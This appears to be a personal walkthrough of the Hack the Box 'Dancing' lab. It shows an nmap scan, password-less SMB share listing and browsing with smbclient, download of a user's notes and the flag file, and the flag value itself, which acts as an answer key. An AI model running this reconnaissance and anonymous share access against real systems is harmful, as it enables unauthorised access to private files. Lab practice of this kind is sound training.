Hack the Box
Starting Pont
Dancing

10.129.150.224

sudo nmap -sV -sC -oA nmap/fawn 10.129.150.224

Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-06-17 18:05 EDT
Nmap scan report for 10.129.150.224
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-18T02:06:13
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.14 seconds

$ smbclient -L \\\\10.129.150.224                                                                                  1 ⨯
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.150.224 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


$ smbclient \\\\10.129.150.224\\WorkShares                                                                         1 ⨯
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1751483 blocks available
smb: \> 

smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

		5114111 blocks of size 4096. 1751483 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \Amy.J\> 

smb: \Amy.J\> cd ..
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

		5114111 blocks of size 4096. 1751435 blocks available
smb: \> cd James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

		5114111 blocks of size 4096. 1751435 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> 

smb: \James.P\> exit
                                                                                                                         
┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/dancing]
└─$ exa
flag.txt  nmap  readme.md  worknotes.txt
                                                                                                                         
┌──(kali㉿kali)-[~/…/CTF/HTB/starting_point/dancing]
└─$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664                           



